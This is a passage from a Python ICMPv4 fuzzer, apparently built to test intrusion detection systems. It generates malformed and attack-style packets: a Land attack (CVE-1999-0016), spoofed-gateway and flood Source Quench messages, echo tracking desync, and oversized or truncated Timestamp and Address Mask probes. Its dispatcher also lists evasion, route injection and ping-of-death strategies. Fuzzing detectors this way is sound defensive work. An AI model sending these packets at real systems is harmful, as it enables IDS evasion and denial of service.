        # Source IP = Destination IP (CVE-1999-0016)
        ip = 0x7F000001
        icmp = _echo(8, 0, payload=os.urandom(56))
        return _raw_ip_packet(1, ip, ip, icmp), "raw_ip"

    else:  # self_reply
        # Echo Request immediately followed by its own Reply (confuses tracking)
        id_val = random.randint(0, 0xFFFF)
        seq = random.randint(0, 0xFFFF)
        payload = os.urandom(56)
        # Return the request; the reply scenario requires two packets, but
        # we embed the reply in the payload of the request for parser confusion
        inner_reply = _echo(0, 0, id_val, seq, payload)
        return _echo(8, 0, id_val, seq, inner_reply), "icmp"


def _build_echo_id_seq_desync():
    """ICMP Echo ID/Sequence tracking confusion.

    Degenerate values, many simultaneous sessions, orphaned replies, port
    collisions, and sequence wraparound.
    """
    variant = random.choice([
        "zero_zero", "max_max", "many_sessions", "orphan_reply",
        "port_collision", "seq_wraparound", "id_reuse",
    ])

    if variant == "zero_zero":
        return _echo(8, 0, id_val=0, seq=0, payload=os.urandom(56)), "icmp"

    elif variant == "max_max":
        return _echo(8, 0, id_val=0xFFFF, seq=0xFFFF, payload=os.urandom(56)), "icmp"

    elif variant == "many_sessions":
        # Unique ID per packet → many concurrent "sessions" in tracker
        return _echo(8, 0, id_val=random.randint(0, 0xFFFF), seq=0,
                     payload=os.urandom(56)), "icmp"

    elif variant == "orphan_reply":
        # Echo Reply with ID/Seq that no Request used
        return _echo(0, 0, id_val=random.randint(0, 0xFFFF),
                     seq=random.randint(0, 0xFFFF), payload=os.urandom(56)), "icmp"

    elif variant == "port_collision":
        # Echo ID matches common TCP port numbers — cross-protocol tracking
        port = random.choice([80, 443, 22, 25, 53, 445])
        return _echo(8, 0, id_val=port, seq=0, payload=os.urandom(56)), "icmp"

    elif variant == "seq_wraparound":
        return _echo(8, 0, id_val=random.randint(0, 0xFFFF),
                     seq=0xFFFF, payload=os.urandom(56)), "icmp"

    else:  # id_reuse
        # Same ID, different payloads (session reuse)
        return _echo(8, 0, id_val=1, seq=random.randint(0, 0xFFFF),
                     payload=os.urandom(random.randint(32, 128))), "icmp"


def _build_source_quench_deprecated():
    """Deprecated ICMP Source Quench (Type 4, RFC 6633) handling abuse.

    Tests whether IDS correctly handles a deprecated type — does it alert,
    ignore, or crash?  Includes oversized embedded data, truncated headers,
    and floods targeting active connections.
    """
    variant = random.choice([
        "basic", "oversized_embedded", "truncated_embedded",
        "tcp_conn_target", "spoofed_gateway", "flood_burst",
    ])

    if variant == "basic":
        inner = _fake_ip_hdr(proto=6) + _tcp8()
        return _error_msg(4, 0, inner), "icmp"

    elif variant == "oversized_embedded":
        # > 576 bytes of embedded data (way more than standard IP+8)
        inner = _fake_ip_hdr(proto=6) + os.urandom(600)
        return _error_msg(4, 0, inner), "icmp"

    elif variant == "truncated_embedded":
        # Less than 28 bytes (minimum IP header + 8 transport)
        inner = _fake_ip_hdr(proto=6)[:16]
        return _error_msg(4, 0, inner), "icmp"

    elif variant == "tcp_conn_target":
        # Targets a plausible active TCP connection
        inner = _fake_ip_hdr(proto=6, src=0xC0A80164, dst=0xC0A80101) + \
                _tcp8(sport=54321, dport=443)
        return _error_msg(4, 0, inner), "icmp"

    elif variant == "spoofed_gateway":
        # Source claims to be the default gateway
        inner = _fake_ip_hdr(proto=6) + _tcp8()
        return _error_msg(4, 0, inner), "icmp"

    else:  # flood_burst
        # Rapid Source Quench for different embedded connections
        src = random.randint(0x0A000001, 0x0AFFFFFF)
        dst = random.randint(0xC0A80001, 0xC0A8FFFE)
        inner = _fake_ip_hdr(proto=6, src=src, dst=dst) + _tcp8()
        return _error_msg(4, 0, inner), "icmp"


def _build_timestamp_address_mask_probe():
    """ICMP Timestamp (Type 13/14) and Address Mask (Type 17/18) parsing abuse.

    Exercises rarely-used code paths: oversized/truncated Timestamp payloads,
    extreme timestamp values, deprecated Address Mask with various mask values.
    """
    variant = random.choice([
        "max_timestamps", "oversized_timestamp", "truncated_timestamp",
        "addr_mask_request", "all_ones_mask", "all_zeros_mask",
        "timestamp_with_ip_ts",
    ])

    ts_id = random.randint(0, 0xFFFF)
    ts_seq = random.randint(0, 0xFFFF)

    if variant == "max_timestamps":
        rest = struct.pack("!HH", ts_id, ts_seq)
        ts_data = struct.pack("!III", 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF)
        return _build_icmp(13, 0, rest, ts_data), "icmp"

    elif variant == "oversized_timestamp":
        # Standard timestamp is 20 bytes; send 200+ bytes
        rest = struct.pack("!HH", ts_id, ts_seq)
        ts_data = struct.pack("!III", 0, 0, 0) + os.urandom(180)
        return _build_icmp(13, 0, rest, ts_data), "icmp"

    elif variant == "truncated_timestamp":
        # Missing transmit timestamp (< 20 bytes total)
        rest = struct.pack("!HH", ts_id, ts_seq)
        ts_data = struct.pack("!I", 0)  # only originate, no receive/transmit
        return _build_icmp(13, 0, rest, ts_data), "icmp"

    elif variant == "addr_mask_request":
        rest = struct.pack("!HH", ts_id, ts_seq)
        mask = struct.pack("!I", 0xFFFFFF00)
        return _build_icmp(17, 0, rest, mask), "icmp"

    elif variant == "all_ones_mask":
        rest = struct.pack("!HH", ts_id, ts_seq)
        mask = struct.pack("!I", 0xFFFFFFFF)
        return _build_icmp(18, 0, rest, mask), "icmp"

    elif variant == "all_zeros_mask":
        rest = struct.pack("!HH", ts_id, ts_seq)
        mask = struct.pack("!I", 0x00000000)
        return _build_icmp(17, 0, rest, mask), "icmp"

    else:  # timestamp_with_ip_ts
        # Timestamp Request where both ICMP and IP layer have timestamp data
        rest = struct.pack("!HH", ts_id, ts_seq)
        ts_data = struct.pack("!III", 12345678, 0, 0)
        icmp_pkt = _build_icmp(13, 0, rest, ts_data)
        # Wrap in IP with Timestamp option
        src_ip = random.randint(0x01000001, 0xFEFFFFFF)
        ip_ts_opt = bytes([68, 12, 5, 0]) + struct.pack("!II", 0, 0)
        return _raw_ip_packet(1, src_ip, 0x7F000001, icmp_pkt,
                              ihl=8, options=ip_ts_opt), "raw_ip"


# ── dispatcher ───────────────────────────────────────────────────────

_BUILDERS = {
    "fragment_reassembly_evasion":    _build_fragment_reassembly_evasion,
    "embedded_header_confusion":      _build_embedded_header_confusion,
    "type_code_matrix_attack":        _build_type_code_matrix_attack,
    "checksum_desync":                _build_checksum_desync,
    "redirect_route_injection":       _build_redirect_route_injection,
    "tunnel_payload_evasion":         _build_tunnel_payload_evasion,
    "pmtud_blackhole":                _build_pmtud_blackhole,
    "unreachable_state_exhaustion":   _build_unreachable_state_exhaustion,
    "ip_option_header_shift":         _build_ip_option_header_shift,
    "ping_of_death_reassembly":       _build_ping_of_death_reassembly,
    "rate_limit_bypass":              _build_rate_limit_bypass,
    "echo_id_seq_desync":             _build_echo_id_seq_desync,
    "source_quench_deprecated":       _build_source_quench_deprecated,
    "timestamp_address_mask_probe":   _build_timestamp_address_mask_probe,
}


_ICMP_OVERRIDE_CAPABLE = frozenset(["fragment_reassembly_evasion", "tunnel_payload_evasion"])

def build_icmp_payload(strategy, payload_override=None):
    """Build an ICMPv4 fuzz payload for the given strategy.

    Returns (data, packet_type) where packet_type is one of:
      "icmp"      — data is raw ICMP bytes (caller wraps in IP)
      "fragments" — data is a list of (payload, offset, mf, ip_id, proto) tuples
      "raw_ip"    — data is a complete IP packet (caller adds Ethernet only)
    """
    builder = _BUILDERS.get(strategy)
    if builder is None:
        # Fallback: simple echo request
        return _echo(8, 0, payload=os.urandom(56)), "icmp"
    if payload_override is not None and strategy in _ICMP_OVERRIDE_CAPABLE:
        return builder(payload_override=payload_override)
    return builder()


# ── mutator class ────────────────────────────────────────────────────

class IcmpMutator:
    """Selects and generates ICMPv4 fuzz payloads via bandit or weighted random."""

    def __init__(self, external_weights=None, bandit=None):
        self.strategies = ICMP_STRATEGIES
        self._external_weights = external_weights
        self._bandit = bandit

    @property
    def weights(self):
        if self._external_weights:
            return [self._external_weights.get(s, 5) for s in self.strategies]
        return ICMP_WEIGHTS

    def mutate(self, payload_override=None):
        """Returns (data, strategy_name, packet_type).

        packet_type: "icmp" | "fragments" | "raw_ip"
        """
        if self._bandit:
            strategy = self._bandit.select_with_weights(self._external_weights or {})
        else:
            strategy = random.choices(self.strategies, weights=self.weights, k=1)[0]
        data, pkt_type = build_icmp_payload(strategy, payload_override=payload_override)
        return data, strategy, pkt_type
